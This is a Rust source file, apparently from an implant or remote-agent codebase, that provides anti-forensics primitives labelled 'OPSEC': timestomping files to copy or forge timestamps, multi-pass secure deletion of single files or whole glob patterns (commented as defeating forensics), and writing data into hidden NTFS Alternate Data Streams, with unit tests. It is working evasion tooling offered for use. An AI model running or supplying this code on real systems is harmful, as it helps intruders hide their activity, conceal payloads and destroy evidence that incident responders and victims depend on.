// src/agent/artifacts.rs
//
// File artifact management primitives for OPSEC:
//   - Timestomping (copy/set file timestamps)
//   - Secure deletion (multi-pass overwrite + delete)
//   - NTFS Alternate Data Streams (write, read, list)

use std::fs;
use std::path::Path;
use rand::RngCore;

// ── Timestomping ───────────────────────────────────────────────────────

/// Copy all timestamps (created, modified, accessed) from a reference
/// file to the target file.
pub fn timestomp_copy(target: &str, reference: &str) -> Result<String, String> {
    let ref_meta = fs::metadata(reference).map_err(|e| format!("Reference: {}", e))?;

    #[cfg(target_os = "windows")]
    {
        // On Windows we need SetFileTime to set all three timestamps
        let modified = ref_meta.modified().map_err(|e| format!("modified: {}", e))?;
        let accessed = ref_meta.accessed().map_err(|e| format!("accessed: {}", e))?;
        let created = ref_meta.created().map_err(|e| format!("created: {}", e))?;
        set_file_times_win(target, Some(created), Some(accessed), Some(modified))?;
        Ok(format!("Timestomped {} → {}", target, reference))
    }

    #[cfg(not(target_os = "windows"))]
    {
        // On Unix, use filetime crate equivalent via libc utimensat
        let modified = ref_meta.modified().map_err(|e| format!("modified: {}", e))?;
        let accessed = ref_meta.accessed().map_err(|e| format!("accessed: {}", e))?;
        set_file_times_unix(target, accessed, modified)?;
        Ok(format!("Timestomped {} → {} (mtime+atime)", target, reference))
    }
}

/// Set a file's timestamps to a specific Unix epoch value.
/// Format: timestomp:set <path> <unix_timestamp>
pub fn timestomp_epoch(path: &str, epoch_secs: i64) -> Result<String, String> {
    let time = std::time::UNIX_EPOCH + std::time::Duration::from_secs(epoch_secs as u64);

    #[cfg(target_os = "windows")]
    {
        set_file_times_win(path, Some(time), Some(time), Some(time))?;
    }

    #[cfg(not(target_os = "windows"))]
    {
        set_file_times_unix(path, time, time)?;
    }

    let dt = chrono::DateTime::<chrono::Utc>::from(time);
    Ok(format!("Timestamps set to {} on {}", dt.to_rfc3339(), path))
}

#[cfg(target_os = "windows")]
fn set_file_times_win(
    path: &str,
    created: Option<std::time::SystemTime>,
    accessed: Option<std::time::SystemTime>,
    modified: Option<std::time::SystemTime>,
) -> Result<(), String> {
    use std::ffi::c_void;
    use std::os::windows::io::AsRawHandle;

    #[repr(C)]
    #[derive(Copy, Clone)]
    struct FILETIME { low: u32, high: u32 }

    extern "system" {
        fn SetFileTime(h: *mut c_void, created: *const FILETIME, accessed: *const FILETIME, modified: *const FILETIME) -> i32;
    }

    fn systime_to_filetime(t: std::time::SystemTime) -> FILETIME {
        // Windows FILETIME: 100ns intervals since 1601-01-01
        // Unix epoch offset: 11644473600 seconds
        let dur = t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default();
        let intervals = (dur.as_secs() + 11644473600) * 10_000_000 + dur.subsec_nanos() as u64 / 100;
        FILETIME { low: intervals as u32, high: (intervals >> 32) as u32 }
    }

    let file = fs::OpenOptions::new().write(true).open(path).map_err(|e| format!("Open: {}", e))?;
    let handle = file.as_raw_handle() as *mut c_void;

    let c = created.map(systime_to_filetime);
    let a = accessed.map(systime_to_filetime);
    let m = modified.map(systime_to_filetime);

    let c_ptr = c.as_ref().map(|f| f as *const FILETIME).unwrap_or(std::ptr::null());
    let a_ptr = a.as_ref().map(|f| f as *const FILETIME).unwrap_or(std::ptr::null());
    let m_ptr = m.as_ref().map(|f| f as *const FILETIME).unwrap_or(std::ptr::null());

    unsafe {
        if SetFileTime(handle, c_ptr, a_ptr, m_ptr) == 0 {
            return Err("SetFileTime failed".into());
        }
    }
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn set_file_times_unix(path: &str, accessed: std::time::SystemTime, modified: std::time::SystemTime) -> Result<(), String> {
    use std::ffi::CString;

    #[repr(C)]
    struct Timespec { tv_sec: i64, tv_nsec: i64 }

    extern "C" {
        fn utimensat(dirfd: i32, path: *const i8, times: *const Timespec, flags: i32) -> i32;
    }

    fn systime_to_timespec(t: std::time::SystemTime) -> Timespec {
        let dur = t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default();
        Timespec { tv_sec: dur.as_secs() as i64, tv_nsec: dur.subsec_nanos() as i64 }
    }

    let c_path = CString::new(path).map_err(|_| "Invalid path")?;
    let times = [systime_to_timespec(accessed), systime_to_timespec(modified)];

    unsafe {
        // AT_FDCWD = -100
        if utimensat(-100, c_path.as_ptr(), times.as_ptr(), 0) != 0 {
            return Err(format!("utimensat failed: {}", std::io::Error::last_os_error()));
        }
    }
    Ok(())
}

// ── Secure Deletion ────────────────────────────────────────────────────

/// Overwrite a file with random data (3 passes), then zero, then delete.
/// More thorough than simple `remove_file` but not DOD-grade (which
/// doesn't matter on SSDs anyway — this defeats casual forensics).
pub fn secure_delete(path: &str) -> Result<String, String> {
    let meta = fs::metadata(path).map_err(|e| format!("Stat: {}", e))?;
    let size = meta.len() as usize;

    if size == 0 {
        fs::remove_file(path).map_err(|e| format!("Delete: {}", e))?;
        return Ok(format!("Deleted empty file: {}", path));
    }

    let mut rng = rand::thread_rng();

    // 3 passes of random data
    for pass in 0..3 {
        let mut buf = vec![0u8; size.min(65536)];
        let mut file = fs::OpenOptions::new().write(true).open(path)
            .map_err(|e| format!("Open pass {}: {}", pass, e))?;

        let mut remaining = size;
        while remaining > 0 {
            let chunk = remaining.min(buf.len());
            rng.fill_bytes(&mut buf[..chunk]);
            use std::io::Write;
            file.write_all(&buf[..chunk]).map_err(|e| format!("Write pass {}: {}", pass, e))?;
            remaining -= chunk;
        }
        file.sync_all().map_err(|e| format!("Sync pass {}: {}", pass, e))?;
    }

    // Final zero pass
    {
        let mut file = fs::OpenOptions::new().write(true).open(path)
            .map_err(|e| format!("Open zero pass: {}", e))?;
        let zeros = vec![0u8; size.min(65536)];
        let mut remaining = size;
        while remaining > 0 {
            let chunk = remaining.min(zeros.len());
            use std::io::Write;
            file.write_all(&zeros[..chunk]).map_err(|e| format!("Write zero: {}", e))?;
            remaining -= chunk;
        }
        file.sync_all().map_err(|e| format!("Sync zero: {}", e))?;
    }

    // Truncate to 0
    fs::OpenOptions::new().write(true).truncate(true).open(path)
        .map_err(|e| format!("Truncate: {}", e))?;

    // Delete
    fs::remove_file(path).map_err(|e| format!("Delete: {}", e))?;

    Ok(format!("Securely deleted: {} ({} bytes, 4 passes)", path, size))
}

/// Secure-delete all files matching a glob pattern in a directory.
pub fn secure_delete_glob(dir: &str, pattern: &str) -> Result<String, String> {
    let dir_path = Path::new(dir);
    if !dir_path.is_dir() { return Err(format!("Not a directory: {}", dir)); }

    let mut count = 0;
    let mut errors = 0;

    if let Ok(entries) = fs::read_dir(dir_path) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if matches_simple_glob(&name, pattern) && entry.path().is_file() {
                match secure_delete(&entry.path().to_string_lossy()) {
                    Ok(_) => count += 1,
                    Err(_) => errors += 1,
                }
            }
        }
    }

    Ok(format!("Deleted {} files ({} errors) matching '{}' in {}", count, errors, pattern, dir))
}

/// Simple glob matching (supports * and ? only).
fn matches_simple_glob(name: &str, pattern: &str) -> bool {
    let mut n = name.chars().peekable();
    let mut p = pattern.chars().peekable();

    while let Some(&pc) = p.peek() {
        match pc {
            '*' => {
                p.next();
                if p.peek().is_none() { return true; }
                while n.peek().is_some() {
                    let remaining_name: String = n.clone().collect();
                    let remaining_pattern: String = p.clone().collect();
                    if matches_simple_glob(&remaining_name, &remaining_pattern) { return true; }
                    n.next();
                }
                return false;
            }
            '?' => { p.next(); if n.next().is_none() { return false; } }
            c => { p.next(); if n.next() != Some(c) { return false; } }
        }
    }
    n.peek().is_none()
}

// ── NTFS Alternate Data Streams (Windows) ──────────────────────────────

/// Write data to an NTFS Alternate Data Stream.
/// ADS path format: "C:\path\file.txt:stream_name"
pub fn ads_write(file_path: &str, stream_name: &str, data: &[u8]) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        let ads_path = format!("{}:{}", file_path, stream_name);
        fs::write(&ads_path, data).map_err(|e| format!("ADS write: {}", e))?;
        Ok(format!("Wrote {} bytes to {}:{}", data.len(), file_path, stream_name))
    }

    #[cfg(not(target_os = "windows"))]
    {
        let _ = (file_path, stream_name, data);
        Err("ADS is NTFS/Windows-only".into())
    }
}

/// Read data from an NTFS Alternate Data Stream.
pub fn ads_read(file_path: &str, stream_name: &str) -> Result<Vec<u8>, String> {
    #[cfg(target_os = "windows")]
    {
        let ads_path = format!("{}:{}", file_path, stream_name);
        fs::read(&ads_path).map_err(|e| format!("ADS read: {}", e))
    }

    #[cfg(not(target_os = "windows"))]
    {
        let _ = (file_path, stream_name);
        Err("ADS is NTFS/Windows-only".into())
    }
}

/// List all ADS on a file by parsing FindFirstStreamW / FindNextStreamW.
pub fn ads_list(file_path: &str) -> Result<Vec<String>, String> {
    #[cfg(target_os = "windows")]
    {
        use std::ffi::c_void;
        use std::ptr;

        #[repr(C)]
        struct WIN32_FIND_STREAM_DATA {
            stream_size: i64,
            stream_name: [u16; 296],
        }

        extern "system" {
            fn FindFirstStreamW(filename: *const u16, info_level: u32, data: *mut WIN32_FIND_STREAM_DATA, flags: u32) -> *mut c_void;
            fn FindNextStreamW(handle: *mut c_void, data: *mut WIN32_FIND_STREAM_DATA) -> i32;
            fn FindClose(handle: *mut c_void) -> i32;
        }

        let wide_path: Vec<u16> = file_path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut data: WIN32_FIND_STREAM_DATA = unsafe { std::mem::zeroed() };
        let mut streams = Vec::new();

        unsafe {
            let handle = FindFirstStreamW(wide_path.as_ptr(), 0, &mut data, 0);
            if handle == (-1isize as *mut c_void) {
                return Ok(streams); // No streams or error
            }

            loop {
                let name_len = data.stream_name.iter().position(|&c| c == 0).unwrap_or(296);
                let name = String::from_utf16_lossy(&data.stream_name[..name_len]);
                // Skip the default ::$DATA stream
                if name != "::$DATA" {
                    streams.push(format!("{} ({} bytes)", name, data.stream_size));
                }

                if FindNextStreamW(handle, &mut data) == 0 { break; }
            }

            FindClose(handle);
        }

        Ok(streams)
    }

    #[cfg(not(target_os = "windows"))]
    {
        let _ = file_path;
        Err("ADS is NTFS/Windows-only".into())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_glob_exact_match() {
        assert!(matches_simple_glob("file.txt", "file.txt"));
        assert!(!matches_simple_glob("file.txt", "file.log"));
    }

    #[test]
    fn test_glob_star_suffix() {
        assert!(matches_simple_glob("file.txt", "*.txt"));
        assert!(matches_simple_glob("report.txt", "*.txt"));
        assert!(!matches_simple_glob("file.log", "*.txt"));
    }

    #[test]
    fn test_glob_star_prefix() {
        assert!(matches_simple_glob("file.txt", "file.*"));
        assert!(matches_simple_glob("file.log", "file.*"));
        assert!(!matches_simple_glob("data.log", "file.*"));
    }

    #[test]
    fn test_glob_star_middle() {
        assert!(matches_simple_glob("file_backup.txt", "file*txt"));
        assert!(matches_simple_glob("filetxt", "file*txt"));
    }

    #[test]
    fn test_glob_question_mark() {
        assert!(matches_simple_glob("file1.txt", "file?.txt"));
        assert!(matches_simple_glob("fileA.txt", "file?.txt"));
        assert!(!matches_simple_glob("file12.txt", "file?.txt"));
    }

    #[test]
    fn test_glob_star_only() {
        assert!(matches_simple_glob("anything", "*"));
        assert!(matches_simple_glob("", "*"));
    }

    #[test]
    fn test_glob_empty_pattern() {
        assert!(matches_simple_glob("", ""));
        assert!(!matches_simple_glob("notempty", ""));
    }

    #[test]
    fn test_secure_delete_creates_and_removes() {
        let dir = std::env::temp_dir().join("rcm_test_secure_delete");
        let _ = fs::create_dir_all(&dir);
        let path = dir.join("secret.txt");
        fs::write(&path, "top secret data that should be wiped").unwrap();
        assert!(path.exists());

        let result = secure_delete(&path.to_string_lossy());
        assert!(result.is_ok());
        assert!(!path.exists());

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_secure_delete_empty_file() {
        let path = std::env::temp_dir().join("rcm_test_empty_delete.tmp");
        fs::write(&path, "").unwrap();
        let result = secure_delete(&path.to_string_lossy());
        assert!(result.is_ok());
        assert!(!path.exists());
    }

    #[test]
    fn test_secure_delete_nonexistent() {
        let result = secure_delete("/tmp/rcm_does_not_exist_12345.tmp");
        assert!(result.is_err());
    }

    #[test]
    fn test_secure_delete_glob_pattern() {
        let dir = std::env::temp_dir().join("rcm_test_glob_delete");
        let _ = fs::create_dir_all(&dir);
        fs::write(dir.join("log1.tmp"), "data1").unwrap();
        fs::write(dir.join("log2.tmp"), "data2").unwrap();
        fs::write(dir.join("keep.txt"), "keep").unwrap();

        let result = secure_delete_glob(&dir.to_string_lossy(), "*.tmp");
        assert!(result.is_ok());
        assert!(!dir.join("log1.tmp").exists());
        assert!(!dir.join("log2.tmp").exists());
        assert!(dir.join("keep.txt").exists());

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_timestomp_epoch() {
        let path = std::env::temp_dir().join("rcm_test_timestomp.tmp");
        fs::write(&path, "test").unwrap();

        // Set to 2020-01-01 00:00:00 UTC
        let result = timestomp_epoch(&path.to_string_lossy(), 1577836800);
        assert!(result.is_ok());

        let meta = fs::metadata(&path).unwrap();
        let modified = meta.modified().unwrap();
        let epoch = modified.duration_since(std::time::UNIX_EPOCH).unwrap().as_secs();
        assert_eq!(epoch, 1577836800);

        let _ = fs::remove_file(&path);
    }
}
